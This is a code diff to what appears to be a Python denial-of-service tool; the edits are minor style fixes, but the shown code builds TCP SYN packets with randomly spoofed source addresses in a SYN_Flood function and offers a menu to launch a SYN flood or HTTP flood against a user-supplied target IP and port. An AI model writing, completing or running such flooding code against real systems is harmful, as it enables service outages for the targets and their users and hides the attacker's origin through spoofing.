@@ -44,11 +44,11 @@ def SYN_Flood(dstIP,dstPort,counter):
 		s_eq = randInt()
 		w_indow = randInt()
 
-		IP_Packet = IP ()
+		IP_Packet = IP()
 		IP_Packet.src = randomIP()
 		IP_Packet.dst = dstIP
 
-		TCP_Packet = TCP ()
+		TCP_Packet = TCP()
 		TCP_Packet.sport = s_port
 		TCP_Packet.dport = dstPort
 		TCP_Packet.flags = "S"
@@ -75,13 +75,13 @@ def main():
     print("2) HTTP Flood")
     option = input("Choose an option: ")
     print(option)
-    if option == '1':
+    if option == "1":
         os.system("clear")
         dstIP = str(input("Target IP: "))
         dstPort = int(input("Target Port: "))
-        counter = input("Packets to send: ")
+        counter = int(input("Packets to send: "))
         SYN_Flood(dstIP,dstPort,int(counter))
-    elif option == '2':
+    elif option == "2":
         os.system("clear")
         target = str(input("Insert Target: "))
         port = int(input("Insert Port: "))
